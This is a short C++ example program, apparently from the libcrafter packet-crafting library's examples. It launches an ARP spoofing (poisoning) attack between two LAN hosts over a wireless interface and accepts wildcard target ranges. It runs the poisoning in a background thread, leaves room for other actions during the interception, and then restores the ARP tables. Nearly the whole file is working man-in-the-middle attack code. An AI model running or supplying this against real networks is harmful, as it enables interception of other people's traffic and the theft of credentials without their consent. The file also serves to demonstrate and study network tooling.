/*
 * Spawn ARP Poison
 *
 * This program illustrate the usage of the ARSpoofing function provided by
 * the library. Is quite simple and very useful when we have to combine another
 * technique with an ARP spoof attack.
 */
#include <iostream>
#include <string>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

int main() {

	/* Init the library */
	InitCrafter();

	/* Set the interface */
	string iface = "wlan0";

	/* Host A IP address */
	string hostA = "192.168.1.4";
	/* HOst B IP address */
	string hostB = "192.168.1.1";

	/*
	 * Begin the ARP poisoning (Sending false ARP requests)
	 * hostB and hostA could be wildcards like:
	 * - 192.168.1.*
	 * - 192.168.1.3-19,192.168.1.200
	 * - etc...
	 */
	ARPContext* context = ARPSpoofingReply(hostB,hostA,iface);
	/*
	 * The function returns immediately, it spawns a thread "on the background"
	 * that does the ARP poisoning
	 */

	/* You can print the information of the context */
	PrintARPContext(*context);

	/* ----------------------------------------------------------------------- */

	/*
	 * Here you can do anything you can think of while the ARP poisoning occurs
	 */

	/* ----------------------------------------------------------------------- */

	/*
	 * Finally, clean the context... This will try to fix the ARP tables sending
	 * false ARP Requests
	 */
	CleanARPContext(context);

	/* Clean up library stuff... */
	CleanCrafter();

	return 0;
}
